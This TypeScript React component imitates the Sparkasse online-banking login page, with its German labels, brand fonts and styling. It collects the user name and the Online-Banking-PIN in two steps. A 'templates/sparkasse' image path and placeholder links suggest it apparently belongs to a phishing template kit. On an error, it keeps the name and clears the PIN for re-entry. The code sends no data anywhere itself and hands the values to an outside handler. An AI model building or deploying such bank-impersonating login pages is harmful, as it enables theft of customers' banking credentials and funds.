import React, { useState, useEffect } from 'react';
import { AlertTriangle } from 'lucide-react';

interface LoginFormProps {
  onSubmit: (data: { username: string; password: string }) => void;
  isLoading?: boolean;
  errorMessage?: string;
  twoStepMode?: boolean;
}

const LoginForm: React.FC<LoginFormProps> = ({ onSubmit, isLoading = false, errorMessage, twoStepMode = true }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [usernameFocused, setUsernameFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [rememberDevice, setRememberDevice] = useState(false);
  // If there's an error message, start on step 2, otherwise step 1 (unless single-step mode)
  const [step, setStep] = useState(errorMessage ? 2 : (twoStepMode ? 1 : 2));
  const [hasAttemptedLogin, setHasAttemptedLogin] = useState(!!errorMessage);
  const [isUsernameEditable, setIsUsernameEditable] = useState(true);
  const [savedUsername, setSavedUsername] = useState('');

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  // If there's an error message or login has been attempted, ensure we're on step 2
  useEffect(() => {
    if (errorMessage) {
      setStep(2);
      setHasAttemptedLogin(true);
      // Clear password on error to allow re-entry
      setPassword('');
      // If we have a saved username, make sure it's preserved and not editable
      if (savedUsername) {
        setIsUsernameEditable(false);
      }
    }
  }, [errorMessage, savedUsername]);

  const handleUsernameSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (username.trim()) {
      // Save the username and make it non-editable
      setSavedUsername(username.trim());
      setIsUsernameEditable(false);
      setStep(2);
    }
  };

  // Function to enable username editing
  const handleChangeUsername = () => {
    setIsUsernameEditable(true);
    setUsername(savedUsername); // Load saved username for editing
    setUsernameFocused(true);
    // Focus the username field after a short delay
    setTimeout(() => {
      const usernameInput = document.querySelector('input[name="username"]') as HTMLInputElement;
      if (usernameInput) {
        usernameInput.focus();
      }
    }, 100);
  };

  // Function to save username changes
  const handleSaveUsername = () => {
    if (username.trim()) {
      setSavedUsername(username.trim());
      setIsUsernameEditable(false);
      setUsernameFocused(false);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isLoading) {
      setHasAttemptedLogin(true);
      // Use saved username if available, otherwise current username
      const finalUsername = savedUsername || username;
      onSubmit({ username: finalUsername, password });
    }
  };

  const isUsernameLabelFloating = username.length > 0 || usernameFocused;
  const isPasswordLabelFloating = password.length > 0 || passwordFocused;

  // Step 1: Username only (only show if no login has been attempted AND two-step mode is enabled)
  if (step === 1 && !hasAttemptedLogin && twoStepMode) {
    return (
      <div style={{
        backgroundColor: 'transparent',
        padding: '0',
        fontFamily: 'SparkasseWebMedium, Helvetica, Arial, sans-serif',
        minHeight: 'calc(100vh - 116px)'
      }}>
        <div style={{
          maxWidth: '1400px',
          margin: '0 auto',
          padding: isMobile ? '20px' : '40px 24px',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          minHeight: 'calc(100vh - 196px)'
        }}>
          {/* Main Title */}
          <h1 style={{
            color: 'white',
            fontSize: isMobile ? '2rem' : '2.5rem',
            fontWeight: 'normal',
            margin: '0 0 48px 0',
            textAlign: 'center',
            fontFamily: 'SparkasseWebBold, Arial, sans-serif',
            fontStyle: 'normal'
          }}>
            Melden Sie sich an
          </h1>

          {/* Username Form Card */}
          <div style={{
            width: isMobile ? '100%' : '580px',
            backgroundColor: '#3c3c3c',
            borderRadius: '8px',
            border: '1px solid #555',
            overflow: 'hidden'
          }}>
            <div style={{
              padding: isMobile ? '24px' : '32px'
            }}>
              <form onSubmit={handleUsernameSubmit}>
                {/* Username Field */}
                <div style={{
                  marginBottom: '24px',
                  position: 'relative'
                }}>
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    onFocus={() => setUsernameFocused(true)}
                    onBlur={() => setUsernameFocused(false)}
                    placeholder=""
                    style={{
                      width: '100%',
                      padding: '28px 16px 8px 16px',
                      border: usernameFocused ? '2px solid #0066cc' : '1px solid #666',
                      borderRadius: '4px',
                      fontSize: '16px',
                      lineHeight: '24px',
                      fontFamily: 'SparkasseWeb, Arial, sans-serif',
                      fontStyle: 'normal',
                      fontWeight: 'normal',
                      backgroundColor: '#2c2c2c',
                      color: 'white',
                      outline: 'none',
                      transition: 'all 0.2s ease',
                      minHeight: '56px',
                      boxSizing: 'border-box'
                    }}
                  />
                  <label style={{
                    position: 'absolute',
                    left: '16px',
                    top: isUsernameLabelFloating ? '8px' : '20px',
                    fontSize: isUsernameLabelFloating ? '12px' : '16px',
                    fontWeight: 'normal',
                    color: usernameFocused ? '#0066cc' : 'rgba(255, 255, 255, 0.7)',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif',
                    fontStyle: 'normal',
                    transition: 'all 0.2s ease',
                    pointerEvents: 'none',
                    transformOrigin: 'left top'
                  }}>
                    Anmeldename
                  </label>
                </div>

                {/* Weiter Button */}
                <div style={{
                  display: 'flex',
                  justifyContent: 'center',
                  marginBottom: '16px'
                }}>
                  <button
                    type="submit"
                    disabled={!username.trim()}
                    style={{
                      width: '50%',
                      padding: '16px',
                      backgroundColor: '#ff0018',
                      opacity: username.trim() ? 1 : 0.5,
                      color: 'white',
                      border: 'none',
                      borderRadius: '50px',
                      fontSize: '16px',
                      fontWeight: 'bold',
                      fontStyle: 'normal',
                      cursor: username.trim() ? 'pointer' : 'not-allowed',
                      transition: 'all 0.2s ease',
                      fontFamily: 'SparkasseWebBold, Arial, sans-serif',
                      textAlign: 'center'
                    }}
                    onMouseOver={(e) => {
                      if (username.trim()) {
                        e.currentTarget.style.backgroundColor = '#d50017';
                      }
                    }}
                    onMouseOut={(e) => {
                      if (username.trim()) {
                        e.currentTarget.style.backgroundColor = '#ff0018';
                      }
                    }}
                  >
                    Weiter
                  </button>
                </div>

                {/* Bottom Links */}
                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  fontSize: '14px',
                  fontFamily: 'SparkasseWeb, Arial, sans-serif'
                }}>
                  <a href="#" style={{
                    color: 'white',
                    textDecoration: 'underline'
                  }}>
                    Sicherheitshinweise
                  </a>
                  <a href="#" style={{
                    color: 'white',
                    textDecoration: 'underline'
                  }}>
                    Zugangsdaten vergessen
                  </a>
                </div>
              </form>
            </div>
          </div>

          {/* Bottom Info */}
          <div style={{
            marginTop: '40px',
            textAlign: 'center'
          }}>
            <p style={{
              color: 'white',
              fontSize: '16px',
              fontFamily: 'SparkasseWeb, Arial, sans-serif',
              margin: '0 0 16px 0'
            }}>
              Sie haben noch kein Online-Banking?{' '}
             <a href="#" style={{
               color: 'white',
               textDecoration: 'underline',
               fontFamily: 'SparkasseWebBold, Arial, sans-serif'
             }}>
               Jetzt freischalten →
             </a>
           </p>
           <p style={{
             color: 'white',
             fontSize: '16px',
             fontFamily: 'SparkasseWeb, Arial, sans-serif',
             margin: '0'
           }}>
             Sie vergessen oft Ihre Anmeldedaten?{' '}
             <a href="#" style={{
               color: 'white',
               textDecoration: 'underline',
               fontFamily: 'SparkasseWebBold, Arial, sans-serif'
             }}>
               In S-Trust speichern →
             </a>
            </p>
          </div>
        </div>
      </div>
    );
  }

  // Step 2: Username + PIN + Save login
  return (
    <div style={{
      backgroundColor: 'transparent',
      padding: '0',
      fontFamily: 'SparkasseWebMedium, Helvetica, Arial, sans-serif',
      minHeight: 'calc(100vh - 116px)'
    }}>
      <div style={{
        maxWidth: '1400px',
        margin: '0 auto',
        padding: isMobile ? '20px' : '40px 24px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        minHeight: 'calc(100vh - 196px)'
      }}>
        {/* Main Title */}
        <h1 style={{
          color: 'white',
          fontSize: isMobile ? '2rem' : '2.5rem',
          fontWeight: 'normal',
          margin: '0 0 48px 0',
          textAlign: 'center',
          fontFamily: 'SparkasseWebBold, Arial, sans-serif',
          fontStyle: 'normal'
        }}>
          Melden Sie sich an
        </h1>

        {/* Login Form Card */}
        <div style={{
          width: isMobile ? '100%' : '580px',
          backgroundColor: '#3c3c3c',
          borderRadius: '8px',
          border: '1px solid #555',
          overflow: 'hidden',
          opacity: isLoading ? 0.6 : 1,
          pointerEvents: isLoading ? 'none' : 'auto',
          transition: 'opacity 0.2s ease'
        }}>
          <div style={{
            padding: isMobile ? '24px' : '32px'
          }}>
            <form onSubmit={handleFinalSubmit}>
              {/* Username Field - Editable in error state */}
              <div style={{
                marginBottom: '24px',
                position: 'relative'
              }}>
                <input
                  name="username"
                  type="text"
                  value={isUsernameEditable ? username : savedUsername}
                  onChange={(e) => {
                    if (isUsernameEditable) {
                      setUsername(e.target.value);
                    }
                  }}
                  onFocus={() => {
                    if (isUsernameEditable) {
                      setUsernameFocused(true);
                    }
                  }}
                  onBlur={() => setUsernameFocused(false)}
                  placeholder=""
                  readOnly={!isUsernameEditable}
                  style={{
                    width: '100%',
                    padding: '28px 80px 8px 16px',
                    border: (isUsernameEditable && usernameFocused) ? '2px solid #0066cc' : '1px solid #666',
                    borderRadius: '4px',
                    fontSize: '16px',
                    lineHeight: '24px',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif',
                    fontStyle: 'normal',
                    fontWeight: 'normal',
                    backgroundColor: isUsernameEditable ? '#2c2c2c' : '#1a1a1a',
                    color: 'white',
                    outline: 'none',
                    transition: 'all 0.2s ease',
                    minHeight: '56px',
                    boxSizing: 'border-box',
                    cursor: isUsernameEditable ? 'text' : 'default'
                  }}
                />
                <label style={{
                  position: 'absolute',
                  left: '16px',
                  top: ((isUsernameEditable ? username.length > 0 : savedUsername.length > 0) || usernameFocused) ? '8px' : '20px',
                  fontSize: ((isUsernameEditable ? username.length > 0 : savedUsername.length > 0) || usernameFocused) ? '12px' : '16px',
                  fontWeight: 'normal',
                  color: (isUsernameEditable && usernameFocused) ? '#0066cc' : 'rgba(255, 255, 255, 0.7)',
                  fontFamily: 'SparkasseWeb, Arial, sans-serif',
                  fontStyle: 'normal',
                  transition: 'all 0.2s ease',
                  pointerEvents: 'none',
                  transformOrigin: 'left top'
                }}>
                  Anmeldename
                </label>
                {/* Change username button */}
                <button
                  type="button"
                  onClick={handleChangeUsername}
                  style={{
                    position: 'absolute',
                    right: '16px',
                    top: '50%',
                    transform: 'translateY(-50%)',
                    background: 'none',
                    border: 'none',
                    cursor: 'pointer',
                    color: '#66ccff',
                    fontSize: '14px',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif',
                    textDecoration: 'underline',
                    display: isUsernameEditable ? 'none' : 'block'
                  }}
                >
                  Ändern
                </button>
                
                {/* Save username button - only show when editing */}
                <button
                  type="button"
                  onClick={handleSaveUsername}
                  style={{
                    position: 'absolute',
                    right: '16px',
                    top: '50%',
                    transform: 'translateY(-50%)',
                    background: 'none',
                    border: 'none',
                    cursor: 'pointer',
                    color: '#66ccff',
                    fontSize: '14px',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif',
                    textDecoration: 'underline',
                    display: isUsernameEditable ? 'block' : 'none'
                  }}
                >
                  Speichern
                </button>
              </div>

              {/* Password Field */}
              <div style={{
                marginBottom: '16px',
                position: 'relative'
              }}>
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => setPasswordFocused(true)}
                  onBlur={() => setPasswordFocused(false)}
                  placeholder=""
                  style={{
                    width: '100%',
                    padding: '28px 100px 8px 16px',
                    border: passwordFocused ? '2px solid #0066cc' : '1px solid #666',
                    borderRadius: '4px',
                    fontSize: '16px',
                    lineHeight: '24px',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif',
                    fontStyle: 'normal',
                    fontWeight: 'normal',
                    backgroundColor: '#2c2c2c',
                    color: 'white',
                    outline: 'none',
                    transition: 'all 0.2s ease',
                    minHeight: '56px',
                    boxSizing: 'border-box'
                  }}
                />
                <label style={{
                  position: 'absolute',
                  left: '16px',
                  top: isPasswordLabelFloating ? '8px' : '20px',
                  fontSize: isPasswordLabelFloating ? '12px' : '16px',
                  fontWeight: 'normal',
                  color: passwordFocused ? '#0066cc' : 'rgba(255, 255, 255, 0.7)',
                  fontFamily: 'SparkasseWeb, Arial, sans-serif',
                  fontStyle: 'normal',
                  transition: 'all 0.2s ease',
                  pointerEvents: 'none',
                  transformOrigin: 'left top'
                }}>
                  Online-Banking-PIN
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  style={{
                    position: 'absolute',
                    right: '12px',
                    top: '50%',
                    transform: 'translateY(-50%)',
                    background: 'none',
                    border: 'none',
                    cursor: 'pointer',
                    color: 'rgba(255, 255, 255, 0.7)',
                    padding: '4px',
                    fontSize: '12px',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif'
                  }}
                >
                  {showPassword ? 'Ausblenden' : 'Anzeigen'}
                </button>
              </div>

              {/* Additional Info */}
              <div style={{
                marginBottom: '24px'
              }}>
                <a href="#" style={{
                  color: '#66ccff',
                  textDecoration: 'none',
                  fontSize: '14px',
                  fontFamily: 'SparkasseWeb, Arial, sans-serif'
                }}>
                  Weitere Informationen
                </a>
              </div>

              {/* Save Login Section with img3.png */}
              <div style={{
                backgroundColor: '#bebebe',
                borderRadius: '8px',
                padding: '24px 16px',
                marginBottom: '24px',
                display: 'flex',
                alignItems: 'center',
                gap: '12px'
              }}>
                {/* Toggle Switch */}
                <div
                  onClick={() => setRememberDevice(!rememberDevice)}
                  style={{
                    width: '44px',
                    height: '24px',
                    backgroundColor: rememberDevice ? '#4CAF50' : '#ccc',
                    borderRadius: '12px',
                    position: 'relative',
                    cursor: 'pointer',
                    transition: 'background-color 0.3s ease',
                    flexShrink: 0
                  }}
                >
                  <div style={{
                    width: '20px',
                    height: '20px',
                    backgroundColor: 'white',
                    borderRadius: '50%',
                    position: 'absolute',
                    top: '2px',
                    left: rememberDevice ? '22px' : '2px',
                    transition: 'left 0.3s ease',
                    boxShadow: '0 2px 4px rgba(0,0,0,0.2)'
                  }} />
                </div>
                <label
                  onClick={() => setRememberDevice(!rememberDevice)}
                  style={{
                    fontSize: '14px',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif',
                    color: '#333',
                    cursor: 'pointer',
                    lineHeight: '1.4',
                    flex: 1
                  }}
                >
                  Dieses Gerät speichern und künftig schneller anmelden.
                </label>
                <div style={{
                  width: '64px',
                  height: '64px',
                  backgroundImage: 'url("/templates/sparkasse/images/img3.png")',
                  backgroundSize: 'contain',
                  backgroundRepeat: 'no-repeat',
                  backgroundPosition: 'center'
                }}
                />
              </div>

              {/* Error Banner */}
              {errorMessage && (
                <div style={{
                  backgroundColor: '#5c2c2c',
                  border: '1px solid #ff6b6b',
                  borderRadius: '8px',
                  padding: '16px',
                  marginBottom: '24px',
                  display: 'flex',
                  alignItems: 'flex-start',
                  gap: '12px'
                }}>
                  <AlertTriangle 
                    size={20} 
                    style={{ 
                      color: '#ff6b6b',
                      marginTop: '2px',
                      flexShrink: 0
                    }} 
                  />
                  <div style={{
                    flex: 1
                  }}>
                    <div style={{
                      color: '#ff6b6b',
                      fontSize: '14px',
                      fontWeight: 'normal',
                      fontFamily: 'SparkasseWebBold, Arial, sans-serif',
                      fontStyle: 'normal',
                      marginBottom: '4px'
                    }}>
                      Anmeldung fehlgeschlagen.
                    </div>
                    <div style={{
                      color: '#ff6b6b',
                      fontSize: '14px',
                      fontFamily: 'SparkasseWeb, Arial, sans-serif',
                      fontStyle: 'normal',
                      lineHeight: '1.4'
                    }}>
                      Bei der Anmeldung ist ein Fehler aufgetreten.
                      <br />
                      Bitte überprüfen Sie Ihre Eingaben und versuchen Sie es erneut.
                    </div>
                  </div>
                </div>
              )}

              {/* Login Button - 50% width, centered */}
              <div style={{
                display: 'flex',
                justifyContent: 'center',
                marginBottom: '16px'
              }}>
                <button
                  type="submit"
                  disabled={isLoading}
                  style={{
                    width: '50%',
                    padding: '16px',
                    backgroundColor: '#ff0018',
                    opacity: isLoading ? 0.5 : 1,
                    color: 'white',
                    border: 'none',
                    borderRadius: '50px',
                    fontSize: '16px',
                    fontWeight: 'bold',
                    fontStyle: 'normal',
                    cursor: isLoading ? 'not-allowed' : 'pointer',
                    transition: 'all 0.2s ease',
                    fontFamily: 'SparkasseWebBold, Arial, sans-serif',
                    textAlign: 'center'
                  }}
                  onMouseOver={(e) => {
                    if (!isLoading) {
                      e.currentTarget.style.backgroundColor = '#d50017';
                    }
                  }}
                  onMouseOut={(e) => {
                    if (!isLoading) {
                      e.currentTarget.style.backgroundColor = '#ff0018';
                    }
                  }}
                >
                  {isLoading ? 'Anmeldung läuft...' : 'Anmelden'}
                </button>
              </div>

              {/* Bottom Links */}
                 <div style={{
                   display: 'flex',
                   justifyContent: 'space-between',
                   alignItems: 'center',
                   fontSize: '14px',
                   fontFamily: 'SparkasseWeb, Arial, sans-serif'
                 }}>
                   <a href="#" style={{
                     color: 'white',
                     textDecoration: 'underline'
                   }}>
                     Sicherheitshinweise
                   </a>
                   <a href="#" style={{
                     color: 'white',
                     textDecoration: 'underline'
                   }}>
                     Zugangsdaten vergessen
                   </a>
                 </div>
            </form>
          </div>
        </div>

        {/* Bottom Info */}
        <div style={{
          marginTop: '40px',
          textAlign: 'center'
        }}>
          <p style={{
            color: 'white',
            fontSize: '16px',
            fontFamily: 'SparkasseWeb, Arial, sans-serif',
            margin: '0 0 16px 0'
          }}>
            Sie haben noch kein Online-Banking?{' '}
            <a href="#" style={{
              color: 'white',
              textDecoration: 'underline',
              fontFamily: 'SparkasseWebBold, Arial, sans-serif'
            }}>
              Jetzt freischalten →
            </a>
          </p>
          <p style={{
            color: 'white',
            fontSize: '16px',
            fontFamily: 'SparkasseWeb, Arial, sans-serif',
            margin: '0'
          }}>
            Sie vergessen oft Ihre Anmeldedaten?{' '}
            <a href="#" style={{
              color: 'white',
              textDecoration: 'underline',
              fontFamily: 'SparkasseWebBold, Arial, sans-serif'
            }}>
              In S-Trust speichern →
            </a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
